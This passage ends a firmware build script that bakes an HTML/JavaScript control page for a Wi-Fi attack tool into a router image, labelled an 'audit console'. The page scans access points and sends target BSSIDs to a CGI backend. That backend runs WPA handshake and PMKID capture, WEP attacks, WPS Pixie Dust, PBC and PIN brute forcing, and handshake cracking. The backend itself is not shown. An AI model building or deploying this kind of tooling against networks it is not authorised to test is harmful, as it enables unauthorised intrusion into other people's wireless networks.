<button class="m" id="w_pbc" onclick="setw('pbc')">PBC按钮</button>
<button class="m" id="w_pin" onclick="setw('pin')">PIN爆破</button>
</div>
<div class="row"><button class="p" onclick="startV('wps')">开跑</button><button class="s" onclick="stop()">停止</button></div>
<div class="st" id="st3">状态：空闲</div>
<pre id="o3">-</pre>
</div>

<div class="card" id="c4" style="display:none">
<div class="row"><button onclick="q('a=cap','o4')">能力矩阵（wifit3 11 项对照）</button><button onclick="q('a=status','o4')">环境</button></div>
<div class="row"><button onclick="q('a=files','o4')">已有文件</button><button class="p" onclick="q('a=crack','o4')">查握手</button></div>
<pre id="o4">点按钮</pre>
</div>

<script>
let tab=0, mode='auto', wmode='pixie';
function go(i){tab=i;for(let k=0;k<5;k++){document.getElementById('c'+k).style.display=k==i?'':'none';document.getElementById('t'+k).className='tab'+(k==i?' on':'');}poll();}
function setm(m){mode=m;['auto','hs','pmkid','watch'].forEach(x=>document.getElementById('m_'+x).className='m'+(x==m?' on':''));}
function setw(m){wmode=m;['pixie','pbc','pin'].forEach(x=>{document.getElementById('w_'+x).className='m'+(x==m?' on':'');});}
function q(u,id){fetch('/cgi-bin/a3v6?'+u).then(r=>r.text()).then(t=>{const e=document.getElementById(id);e.textContent=t;e.scrollTop=99999;});}
function doScan(){
  document.getElementById('aps').innerHTML='<span style="color:#8b949e">扫描中…十几秒</span>';
  let s=document.getElementById('scansec').value||13, ch=document.getElementById('scanch').value||0;
  fetch('/cgi-bin/a3v6?a=list&s='+s+'&ch='+ch).then(r=>r.text()).then(t=>{
    const o=document.getElementById('o0');o.textContent=t;o.scrollTop=99999;
    let rows=t.trim().split('\n').filter(x=>x.split('|').length>=6);
    if(!rows.length){document.getElementById('aps').innerHTML='没扫到 AP';return;}
    document.getElementById('aps').innerHTML=rows.map(r=>{
      let p=r.split('|'), s=p[0], f=p[6]?' <b style="color:#d29922">WPA3</b>':'';
      let safe=s.replace(/'/g,'').replace(/[<>]/g,'');
      return '<button class="ap" onclick="pick(\''+p[1]+'\',\''+safe+'\')"><b>'+safe+'</b>'+f+' <span>'+p[4]+' CH'+p[2]+' '+p[3]+'dBm 客户端'+p[5]+'</span><br><span>'+p[1]+'</span></button>';
    }).join('');
  });
}
function pick(b,s){
  document.getElementById('tgt').value=b;
  document.getElementById('wept').value=b;
  document.getElementById('wpst').value=b;
  document.getElementById('st1').textContent='目标：'+s+' ('+b+')';
}
function startV(v){
  let t=document.getElementById('tgt').value.trim();
  if(v=='wep')t=document.getElementById('wept').value.trim();
  if(v=='wps')t=document.getElementById('wpst').value.trim();
  if(!t){alert('先填目标或从扫描里点一个');return;}
  let n=(v=='wep'?document.getElementById('weps').value:document.getElementById('sec').value)||180;
  let m=(v=='wps'?wmode:mode);
  const which=v=='wep'?'o2':(v=='wps'?'o3':'o1');
  q('a=start&v='+v+'&t='+encodeURIComponent(t)+'&s='+n+'&m='+m,which);
}
function stop(){q('a=stop','o1');['st1','st2','st3'].forEach(i=>document.getElementById(i).textContent='状态：已停');}
function poll(){
  if(tab==1||tab==2||tab==3){
    let v=tab==2?'wep':(tab==3?'wps':'hs'), oid=tab==2?'o2':(tab==3?'o3':'o1'), sid='st'+(tab==1?'1':tab);
    fetch('/cgi-bin/a3v6?a=poll&v='+v).then(r=>r.text()).then(t=>{
      const o=document.getElementById(oid);o.textContent=t;o.scrollTop=99999;
      document.getElementById(sid).textContent='状态：'+(t.indexOf('STATE=yes')>=0?'运行中':'空闲');});
  }
}
setInterval(poll,2000);
</script></body></html>
PAGE6_EOF
chmod 644 "$SRC/files/www/a3v6.html"
echo "==> [v35] 审计台 6.0（w3v6/cap6/a3v6/a3v6.html）已烘入镜像"
